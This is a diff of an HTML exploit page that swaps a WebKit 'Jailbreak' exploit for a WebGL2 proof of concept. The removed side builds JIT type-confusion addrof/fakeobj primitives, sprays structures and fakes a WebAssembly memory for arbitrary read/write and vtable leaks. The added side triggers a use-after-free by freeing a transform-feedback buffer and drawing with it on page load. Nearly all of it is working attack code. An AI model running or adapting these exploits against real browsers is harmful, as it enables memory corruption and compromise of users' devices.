@@ -1,685 +1,121 @@
 <html>
     <head>
-        <style>
-            body {
-                font-family: monospace;
-            }
-            </style>
-        </head>
-    <title>Jailbreak</title>
-    <body>
+        <META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+        <META HTTP-EQUIV="Expires" CONTENT="-1">
+    </head>    
+    <script type="vertex" id="vs">
+        #version 300 es
         
-        </body>
-<script src="utils.js"> </script>
-<script>
-    //var magic =  r32(base);
-    //log('[+] Which has magic '+magic.toString(16));
-    let alert1 = function(msg) {
-        document.body.innerText += msg + '\n';
-    }
-    function dec2hex(n) {
-        if(n < 0) {
-            n = 0xFFFFFFFF + n + 1;
+        layout (location=0) in vec4 position;
+        layout (location=1) in vec3 color;
+        
+        out vec3 vColor;
+        out float sum;
+
+        void main() {
+            vColor = color;
+            gl_Position = position;
         }
-        return "0x" + ("00000000" + n.toString(16).toUpperCase()).substr(-8);
-    }
-    function hex2a(hex) {
-var str = '';
-for (var i = 0; i < hex.length; i += 2) {
-    var v = parseInt(hex.substr(i, 2), 16);
-    if (v) str += String.fromCharCode(v);
-}
-return str;
-}
-    function _u32(i)
-{
-    return b2u32(this.read(i, 4));
-}
+    </script>
+    <script type="fragment" id="fs">
+        #version 300 es
+        precision highp float;
+        
+        in vec3 vColor;
+        out vec4 fragColor;
 
+        void main() {
+            fragColor = vec4(vColor, 1.0);
+        }
+    </script>
+    <body onload="poc()">
+        <canvas id="canvas" width="1024" height="1024"></canvas>
+    </body>
 
-
-
-
-
-
-
-
-function fsyms(mem, base, segs, want, syms)
-{
-    want = Array.from(want); // copy
-    if(syms === undefined)
-    {
-        syms = {};
-    }
-
-    var stab = null;
-    alert1("here");
-    var ncmds = memory.u32(Add(base, 0x10));
-    for(var i = 0, off = 0x20; i < ncmds; ++i)
-    {
-        var cmd = memory.u32(Add(base, off))
-        if(cmd == 0x2) // LC_SYMTAB
+    <script>        
+        function build_link_program()
         {
-            var b = memory.read(Add(base, off + 0x8), 0x10);
-            stab =
-            {
-                symoff:  b2u32(b.slice(0x8, 0xc)),
-                nsyms:   b2u32(b.slice(0xc, 0x10)),
-                stroff:  b2u32(b.slice(0x10, 0x14)),
-                strsize: b2u32(b.slice(0x14, 0x18)),
-            };
-            break;
+            var vsSource = document.getElementById("vs").text.trim();
+            var fsSource = document.getElementById("fs").text.trim();
+            
+            var vertexShader = gl.createShader(gl.VERTEX_SHADER);
+            gl.shaderSource(vertexShader, vsSource);
+            gl.compileShader(vertexShader);
+
+            if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
+                console.error(gl.getShaderInfoLog(vertexShader));
+            }
+
+            var fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+            gl.shaderSource(fragmentShader, fsSource);
+            gl.compileShader(fragmentShader);
+
+            if (!gl.getShaderParameter(fragmentShader, gl.COMPILE_STATUS)) {
+                console.error(gl.getShaderInfoLog(fragmentShader));
+            }
+
+            var program = gl.createProgram();
+            gl.attachShader(program, vertexShader);
+            gl.attachShader(program, fragmentShader);
+
+            gl.transformFeedbackVaryings(
+                program,
+                ['sum'],
+                gl.SEPARATE_ATTRIBS,
+            );        
+
+            gl.linkProgram(program);
+
+            if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
+                console.error(gl.getProgramInfoLog(program));
+            }
+            return program;            
         }
-        off += memory.u32(Add(base, off + 0x4));
-    }
-    if(stab == null)
-    {
-        fail("stab");
-    }
-    var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
-    var fn = function(i)
-    {
-        return memory.read(Add(tmp.base, tmp.off + i),0x10);
-    };
-    for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
-    {
-        tmp.off = memory.u32(off2addr(segs, stab.symoff + i * 0x10));
-        for(var j = 0; j < want.length; ++j)
+
+        function poc()
         {
-            var s = want[j];
-            if((strcmp(fn, s)))
-            {
-                syms[s] = memory.read_i64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
-                want.splice(j, 1);
-                break;
-            }
-        }
-    }
-    return syms;
-}
+            canvas = document.getElementById("canvas");
+            gl = canvas.getContext("webgl2"); //create to webgl2 context.
+            gl.clearColor(0, 0, 0, 1);
 
-    //log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
-    //tmp = base;
-    //var hdr = Add(0x180000000,slide);
-   // log(hdr + hdr1)
-   let count = 1;
-/*
- * This code is taken from a GitHub user that I sadly forgot the name of.
- * The code exploits a vulnerability discovered in WebKit by Luca Todesco.
- * Rumours are that it has been patched after iOS 13 beta 2.
- * Exploit primitives are gained eventually using Linus Henze's method with WebAssembly.
- * It is under no circumstance justified to alter or reuse the code for the harm of innocent users or counter-intelligence.
- * The purpose of this exploit is to demonstrate the impact of zero- and one-click exploits and to run mach_swap without any codesignature requirements.
-*/
-var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
-var VM_PROT_NONE = 0x0
-var VM_PROT_READ = 0x1
-var VM_PROT_WRITE = 0x2
-var VM_PROT_EXECUTE = 0x4
-//var VM_PROT_NO_CHANGE = 8
-//var VM_PROT_COPY = 16
-let fail = function fail(x)
-    {
-        alert('FAIL: ' + x);
-        location.reload();
-        throw null;
-    }
-function ha (hex) {
-    var string = '';
-    for (var i = 0; i < hex.length; i += 2) {
-      string += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
-    }
-    return string;
-}
-function sleep(seconds){
-    var waitUntil = new Date().getTime() + seconds*1000;
-    while(new Date().getTime() < waitUntil) true;
-}
-function GetErrorCount(){
-    return document.getElementsByClassName("error").length;
-}
-function b2u32(b){
-    return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
-}
-function hexdump(buffer, blockSize, base) {
-    blockSize = blockSize || 16;
-    var lines = [];
-    var hex = "0123456789ABCDEF";
-    for (var b = 0; b < buffer.length; b += blockSize) {
-        var block = buffer.slice(b, Math.min(b + blockSize, buffer.length));
-        var addr = Add(base,new Int64('0x'+("0000" + b.toString(16)).slice(-4))).toString(16);
-        var codes = block.split('').map(function (ch) {
-            var code = ch.charCodeAt(0);
-            return " " + hex[(0xF0 & code) >> 4] + hex[0x0F & code];
-        }).join("");
-        codes += "   ".repeat(blockSize - block.length);
-        var chars = block.replace(/[\x00-\x1F\x20]/g, '.');
-        chars +=  " ".repeat(blockSize - block.length);
-        lines.push(addr + " " + codes + "  " + chars);
-    }
-    return lines.join("<br/>");
-}
-let logic = 0;
+            var program = build_link_program();
+            gl.useProgram(program);
 
-function mappedAddress(mapping, addr1) {
-    if(!(addr1 instanceof Int64)) addr1 = new Int64(addr1);
-    for (cc = 0; cc < mapping.length; ++cc) {
-        if ((mapping[cc].addr <= addr1) && (addr1 < (Add(mapping[cc].addr,mapping[cc].size)))) {
-            // >= <
-            var cacheoffset = Sub(Add(mapping[cc].fileoff,addr1),mapping[cc].addr);
-            //alert("debug-cacheoffset:" + cacheoffset)
-            return cacheoffset;
-        }
-        else {
-            alert("mismatch" + addr1 + "vs" + Add(mapping[cc].addr,mapping[cc].size) + "or" + mapping[cc].addr)
-        }
-    }
-}
-function off2addr(mappings, off)
-    {
-  
-        if(!(off instanceof Int64)) off = new Int64(off);
-        for(var i = 0; i < mappings.length; ++i)
-        {
-            var start = mappings[i].fileoff; //cachestart
-            var end   = Add(start, segs[i].size); //cacheend
-           // alert("start" + start + "end" + end + "off" + off)
-            if
-            (
-                (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
-                (end.hi() > off.hi() || (end.hi() == off.hi() && end.lo() > off.lo()))
-            )
-            {
-                //logic = 1;
-                //alert("returning"+ Add(segs[i].addr, Sub(off, start)));
-                return Add(mappings[i].addr, Sub(off, start));
-            }
+            var positions = new Float32Array([
+                -0.5, -0.5, 0.0,
+                0.5, -0.5, 0.0,
+                0.0, 0.5, 0.0
+            ]);
+            const tf = gl.createTransformFeedback();
+            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
 
-        }
-        //return new Int64("0x4141414141414141");
-    }
+            var ab = new ArrayBuffer( 0x1c8 );
+            var f64 = new Float64Array(ab);
+            var data = new Uint8Array(ab).fill(0x41);
 
-function strcmp(b, str)
-{
-    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
-    for(var i = 0; i < str.length; ++i)
-    {
-        if(fn(i) != str.charCodeAt(i))
-        {
+            var sumBuffer = gl.createBuffer();
             
-            return false;
-        }
-    }
-    return fn(str.length) == 0;
-}
-function makeJITCompiledFunction() {
-    function target(x) {
-        return x;
-    }
-    // Force JIT compilation.
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    return target;
-}
-function exploit(){
-    var a = [13.37, 13.37];
-    a[0] = {};
-    var fixup = null;
-    var referenceFloat64Array = new Float64Array(0x1000);
-    function str2ab(str) {
-        var array = new Uint8Array(str.length);
-        for(var i = 0; i < str.length; i++) {
-            array[i] = str.charCodeAt(i);
-        }
-        return array.buffer
-    }
-    // adjusted copy paste from: http://rce.party/wtf.js
-    // they failed to model a lot of objects,
-    // so we can abuse this to make addrof once and fakeobj 2 times..
-    // altought this can be written nicer..
-    function __addrof(val){
-        let s = new Error(); 
-        let confuse = new Array(13.37,13.37); 
-        s[1] = 1;
-        let hack = 0;
-        Error.prototype.__proto__ = new Proxy(Error.prototype.__proto__, {has: function() {
-            if (hack) {
-                confuse[0] = val;
-            }
-        }}); 
-        function victim(oj,f64,u32,doubleArray,high) {
-            doubleArray[0];
-            let r = 5 in oj;
-            f64[0] = f64[1] = doubleArray[0];
-            u32[3] = high;
-            doubleArray[0] = f64[0];
-            return r;
-        }
-        let u32 = new Uint32Array(4);
-        let f64 = new Float64Array(u32.buffer); 
-        for(let i=0; i<10000; i++) victim(s,f64,u32,confuse,0);
-        hack = 1;
-        victim(s,f64,u32,confuse,0);
-        let add = (u32[0]+u32[1]*0x100000000);
+            gl.bindBuffer(gl.ARRAY_BUFFER, sumBuffer);
+            gl.bufferData(gl.ARRAY_BUFFER, 24, gl.STATIC_DRAW);        
             
-        let h = (u32[0]+u32[1]*0x100000000).toString(16)[0]
-        victim(s,f64,u32,confuse,h);
-        return add;    
-    }
-    function addrof2(val){
-        let s = new Function(); 
-        let confuse = new Array(13.37,13.37); 
-        s[1] = 1;
-        let hack = 0;
-        Function.prototype.__proto__ = new Proxy(Function.prototype.__proto__, {has: function() {
-            if (hack) {
-                confuse[0] = val;
-            }
-        }}); 
-        function victim(oj,f64,u32,doubleArray,high) {
-            doubleArray[0];
-            let r = 5 in oj;
-            f64[0] = f64[1] = doubleArray[0];
-            u32[3] = high;
-            doubleArray[0] = f64[0];
-            return r;
-        }
-        let u32 = new Uint32Array(4);
-        let f64 = new Float64Array(u32.buffer); 
-        for(let i=0; i<10000; i++) victim(s,f64,u32,confuse,0);
-        hack = 1;
-        victim(s,f64,u32,confuse,0);
-        let add = (u32[0]+u32[1]*0x100000000);
+            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, sumBuffer);
             
-        let h = (u32[0]+u32[1]*0x100000000).toString(16)[0]
-        fixup = h;
-        victim(s,f64,u32,confuse,h);
-        return add;
-    }
-    function fake_obj_at_address(where,high){
-        let s = new Date(); 
-        let confuse = new Array(13.37,13.37); 
-        s[1] = 1;
-        let hack = 0;
-        Date.prototype.__proto__ = new Proxy(Date.prototype.__proto__, {has: function() {
-            if (hack) {
-                confuse[1] = {};
-            }
-        }}); 
-        function victim(oj,f64,u32,doubleArray) {
-            doubleArray[0];
-            let r = 5 in oj;
-            f64[0] = f64[1] = doubleArray[1];
+            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, null);
+
+            var positionBuffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+            gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
+            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
+            gl.beginTransformFeedback(gl.TRIANGLES);
+
+            var dummy = gl.createBuffer();
+            gl.bindBuffer( gl.ARRAY_BUFFER, dummy);
+
+            gl.deleteBuffer( sumBuffer ); //free buffer object
+            gl.bufferData( gl.ARRAY_BUFFER, data, gl.DYNAMIC_DRAW ); //reclaim
+
+            gl.drawArrays(gl.TRIANGLES, 0, 3); //in drawArrays, use freed buffer object.
             
-            u32[3] = high; 
-            u32[2] = where;       
-            doubleArray[1] = f64[1];       
-            return r;
         }
-        let u32 = new Uint32Array(4);
-        let f64 = new Float64Array(u32.buffer); 
-        for(let i=0; i<10000; i++) victim(s,f64,u32,confuse);
-        hack = 1;
-        victim(s,f64,u32,confuse);
-        return confuse[1];
-    }
-    function fake_obj_at_address2(where,high){
-        let s = new Intl.Collator(); 
-        let confuse = new Array(13.37,13.37); 
-        s[0] = 1;
-        let hack = 0;
-        Intl.Collator.prototype.__proto__ = new Proxy(Intl.Collator.prototype.__proto__, {has: function() {
-            if (hack) {
-                confuse[1] = {};
-            }
-        }}); 
-        function victim(oj,f64,u32,doubleArray) {
-            doubleArray[0];
-            let r = 5 in oj;
-            f64[0] = f64[1] = doubleArray[1];
-            u32[3] = high;
-            u32[2] = where;     
-            doubleArray[1] = f64[1];       
-            return r;
-        }
-        let u32 = new Uint32Array(4);
-        let f64 = new Float64Array(u32.buffer); 
-        for(let i=0; i<100000; i++) victim(s,f64,u32,confuse);
-        hack = 1;
-        victim(s,f64,u32,confuse);
-            
-        return confuse[1];
-    }
-    function pwn()
-{
-
-function foo(obj) {
-   return delete obj['x'];
- }
-// noInline(foo);
-//foo(null);
-
-  let o = {};
-
-  for (let i = 0; i < 10000; ++i) {
-   Object.defineProperty(o, 'x', {});
-   foo({});
-   foo({x:0x4141414141});
-}
-        alert1("starting");
-        log('[*] Spraying structures to get a butterfly (1/2)...');
-        // copy paste from: 
-        // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
-        var structs = [];
-        for (var i = 0; i < 0x5000; i++) {
-            var a = new Float64Array(1);
-            a['prop' + i] = 1337;
-            structs.push(a);
-        }
-        
-        log('[*] Spraying structures to get a butterfly (2/2)...');
-        for (var i = 0; i < 50; i++) {
-            var a = new WebAssembly.Memory({inital: 0});
-            a['prop' + i] = 1339;
-            structs.push(a);
-        }
-        
-        log('[*] Preparing R/W primitives...');
-        
-        var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b';
-        var webAssemblyBuffer = str2ab(webAssemblyCode);
-        var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
-        
-        var jsCellHeader = new Int64([
-            0x00, 0x10, 0x00, 0x00,
-            0x0,                    
-            0x2c,                   
-            0x08,                  
-            0x1                     
-        ]);
-        
-        var wasmBuffer = {
-            jsCellHeader: jsCellHeader.asJSValue(),
-            butterfly: null,
-            vector: null,
-            memory: null,
-            deleteMe: null
-        };
-        
-        var wasmInternalMemory = {
-            jsCellHeader: null,
-            memoryToRead: {}, 
-            sizeToRead: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), 
-            size: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), 
-            initialSize: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), 
-            junk1: null,
-            junk2: null,
-            junk3: null,
-            junk4: null,
-            junk5: null,
-        };
-        
-        var leaker = {
-            objectToLeak: null
-        };
-        delete wasmBuffer.butterfly;
-        delete wasmBuffer.vector;
-        delete wasmBuffer.deleteMe;
-        delete wasmInternalMemory.junk1;
-        delete wasmInternalMemory.junk2;
-        delete wasmInternalMemory.junk3;
-        delete wasmInternalMemory.junk4;
-        delete wasmInternalMemory.junk5;
-        
-        var realWasmMem = new WebAssembly.Memory({inital: 0x1});
-        sleep(5);
-        var wasmBufferRawAddr = addrof2(wasmBuffer);
-        if (wasmBufferRawAddr == 0x7ff8000000000000) {
-            //log("[+] Got A NAN address which invalid reloading");
-            fail("[+] Got A NAN address which is invalid ... reloading");
-        }
-        log('[+] Got WebAssembly buffer at 0x'+wasmBufferRawAddr.toString(16));
-        let u = new Int64(wasmBufferRawAddr).toString()[9];
-        var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr+16,parseInt(u));
-        var maxtry = 0;
-        
-        if (fakeWasmBuffer instanceof WebAssembly.Memory) {
-            log('gotcha!');
-            //continue;
-        } else {
-            while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
-            jsCellHeader.assignAdd(jsCellHeader, Int64.One);
-            wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
-            maxtry++;
-            if (maxtry == 100000)
-            {
-                fail("wow 5000 tries on getting valid structid failed!!!");
-            }
-        }
-            log('[+] Successfully got fakeobj as WASMObject');
-    } /*else {
-        log('[+] Successfully got fakeobj as WASMObject');
-    }*/
-        //log('[+] Successfully got fakeobj as WASMObject');
-        var wasmMemRawAddr = __addrof(wasmInternalMemory);
-        var wasmMem = fake_obj_at_address2(wasmMemRawAddr+16,parseInt(u));    
-        
-        wasmBuffer.memory = wasmMem;
-        
-        var importObject = {
-            imports: {
-                mem: fakeWasmBuffer
-            }
-        };
-        
-        //log('[*] We now have early R/W primitives that should work with the WASM memory...');
-        
-        function read_i64(readingFunc, offset) {
-            var low = readingFunc(offset * 4);
-            var midLow = readingFunc((offset * 4) + 1);
-            var midHigh = readingFunc((offset * 4) + 2);
-            var high = readingFunc((offset * 4) + 3);
-            return Add(ShiftLeft(Add(ShiftLeft(Add(ShiftLeft(high, 2), midHigh), 2), midLow), 2), low);
-        }
-        function write_i64(writingFunc, offset, value) {
-            writingFunc(offset * 4, ShiftRight(value, 0).asInt16());
-            writingFunc((offset * 4) + 1, ShiftRight(value, 2).asInt16());
-            writingFunc((offset * 4) + 2, ShiftRight(value, 4).asInt16());
-            writingFunc((offset * 4) + 3, ShiftRight(value, 6).asInt16());
-        }
-        
-        function createObjWriter(obj) {
-            wasmInternalMemory.memoryToRead = obj;
-            var module = new WebAssembly.Instance(webAssemblyModule, importObject);
-            return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
-        }
-    
-        
-        var fakeWasmInternalBufferWriter = createObjWriter(wasmMem);
-        var wasmInternalBufferWriter = fakeWasmInternalBufferWriter;
-        
-        function createDirectWriter(address) {
-            wasmInternalBufferWriter.write_i64(1, address);
-            var module = new WebAssembly.Instance(webAssemblyModule, importObject);
-            return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
-        }
-        
-        var realWasmWriter = createObjWriter(realWasmMem);
-        var realWasmInternalMemAddr = realWasmWriter.read_i64(3);
-        wasmInternalBufferWriter = createDirectWriter(realWasmInternalMemAddr);
-        /*for (var z = 0; z < 10000; z++) {
-            var chewjittime = [0x7fff000000000000];
-            chewjittime[1] = {a:0x41312111};
-        }*/
-        var leakerWriter = createObjWriter(leaker);
-        wasmInternalBufferWriter.write_i64(2, new Int64('0x0FFFFFFFFFFFFFFF'));
-        wasmInternalBufferWriter.write_i64(3, new Int64('0x0FFFFFFFFFFFFFFF'));
-        wasmInternalBufferWriter.write_i64(4, new Int64('0x0FFFFFFFFFFFFFFF'));
-        var realInternalBufferAddr = wasmInternalBufferWriter.read_i64(1);
-        importObject.imports.mem = realWasmMem;
-        
-        addrof = function(obj) {
-            leaker.objectToLeak = obj;
-            return leakerWriter.read_i64(2);
-        }
-        
-        fakeobj = function(addr) {
-            leakerWriter.write_i64(2, addr);
-            return leaker.objectToLeak;
-        }
-        
-        createObjWriter = function(obj) {
-            return createDirectWriter(addrof(obj));
-        }
-        
-        var writer = createObjWriter(wasmMem);
-        writer.write_i64(0, Int64.One);
-        var wasmBufferWriter = createObjWriter(wasmBuffer);
-        var writer = createObjWriter(wasmInternalMemory);
-        wasmBufferWriter.write_i64(0, new Int64('0x0000000000000007')); 
-        wasmBufferWriter.write_i64(2, new Int64('0x0000000000000007'));
-        
-        writer.write_i64(4, Int64.Zero);
-        writer.write_i64(5, Int64.Zero);
-        writer.write_i64(6, Int64.Zero);
-        writer.write_i64(7, Int64.Zero);
-        writer.write_i64(0, new Int64('0x0000000000000007'));
-        writer.write_i64(2, new Int64('0x0000000000000007'));
-        
-        log('[*] We now have stable R/W primitives, hooray!');
-        var memory = {
-            create_writer: function(addrObj) {
-                if (addrObj instanceof Int64) {
-                    var writer = createDirectWriter(addrObj);
-                    return writer;
-                } else {
-                    var writer = createObjWriter(addrObj);
-                    return writer;
-                }
-            },
-            read_i64: function(addrObj, offset) {
-                var writer = this.create_writer(addrObj);
-                return writer.read_i64(offset);
-            },
-            write_i64: function(addrObj, offset, value) {
-                var writer = this.create_writer(addrObj);
-                writer.write_i64(offset, value);
-            },
-            read_i32: function(addrObj, offset) {
-                var writer = this.create_writer(addrObj);
-                return new Int64(writer.read_i32(offset));
-            },
-            write_i32: function(addrObj, offset, value) {
-                var writer = this.create_writer(addrObj);
-                writer.write_i32(offset, value);
-            },
-            read_i8: function(addrObj, offset) {
-                var writer = this.create_writer(addrObj);
-                return writer.read_i8(offset);
-            },
-            write_i8: function(addrObj, offset, value) {
-                var writer = this.create_writer(addrObj);
-                writer.write_i8(offset, value);
-            },
-            write: function(addrObj, data, length) {
-                var offset = 0;
-                var writer = this.create_writer(addrObj);
-                for (var i = 0; i < length; i++) {
-                    writer.write_i8(offset + i, data[i]);
-                }
-            },
-            read: function(addrObj, length) {
-                var offset = 0;
-                var writer = this.create_writer(addrObj);
-                var arr = new Uint8Array(length);
-                for (var i = 0; i < length; i++) {
-                    arr[i] = writer.read_i8(offset + i);
-                }
-                return arr;
-            },
-            readInt64: function(addrObj) {
-                //var offset = 0;
-                //var writer = this.create_writer(addrObj);
-                return this.read_i64(addrObj,0);
-            },
-            writeInt64: function(addrObj, offset, value) {
-                var writer = this.create_writer(addrObj);
-                writer.write_i64(offset, value);
-            },
-            copyfrom: function(addrObj, offset, length) {
-                offset = 0;
-                var writer = this.create_writer(addrObj);
-                var arr = new Uint8Array(length);
-                for (var i = 0; i < length; i++) {
-                    arr[i] = writer.read_i8(offset + i);
-                }
-                return arr;
-            },
-            write_non_zero: function(where, what) {
-            for (var i = 0; i < what.length; ++i) {
-                if (what[i] != 0) {
-                        this.write_i64(where + i*8, 0, what[i])
-                }
-            }
-           },
-        }
-        var r32 = function(addr){
-            addr= new Int64(addr);
-            return new Int64('0x'+memory.read_i8(Add(addr, 3)).toString(16) + memory.read_i8(Add(addr, 2)).toString(16) + memory.read_i8(Add(addr, 1)).toString(16) + memory.read_i8(addr).toString(16));
-        };
-        memory.u32 = _u32;
-        log('[*] Creating the HTMLDivElement wrapper...');
-        var d = document.createElement('div');
-        let ad_div = addrof(d);
-        log('[+] Address of the div is '+ad_div.toString(16));
-        //alert(FPO)
-        let exe_ptr = memory.read_i64(Add(ad_div, FPO),0);
-        log('[+] Executable instance is at '+exe_ptr.toString(16));
-        let v_tlb = memory.read_i64(exe_ptr,0);
-        log('[+] divelement vtable seems to be at '+v_tlb.toString(16));
-        var anchor = memory.read_i64(v_tlb,0);
-         var bb = {};
-        bb[0] = 1.1
-        var bbaddr = addrof(bb);
-        //about to burn a vtable leak method publically RIP
-        var print = log;
-         print("object address?" + bbaddr);
-        var vm = memory.read_i64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120,0) //should poin
-        print("JSC::VM Struct @" + vm);
-        //m_runloop contains a vtable at offset 0...
-        // m_runloop is + 0x18 from JSC::VMStruct!
-        //var m_runloop = memory.read_i64(vm + 0x18,0);
-        //hopefully points to JavaScriptCore Base!
-        //print("m_runloop @ " + m_runloop)
-        //var vtable = memory.read_i64(m_runloop,0);
-        //var jscbase = Sub(vtable, new Int64(vtable).lo() & 0xfff);
-        //print("vtable @ " + vtable + "vs" + v_tlb);
-	//var anchor1 = memory.read_i64(vtable,0);
-	//print("anchor @" + anchor + "vs" + anchor1);
-        
-        
-        success = 0;
-        }
-        
-
-    
-    let log = alert1
-    var success = 2;
-        try{
-        pwn();
-    }
-    catch(yyy){
-        fail('Error: ' + yyy + (yyy != null ? '\n' + yyy.stack : ''));
-    }
-    if (success == 0) {
-        log("Script completed with "+ GetErrorCount() + " error(s).", LOG_INFO);
-    } else {
-        fail("failed");
-    }
-    }
-
-exploit();
-
-</script>
+    </script>
 </html>
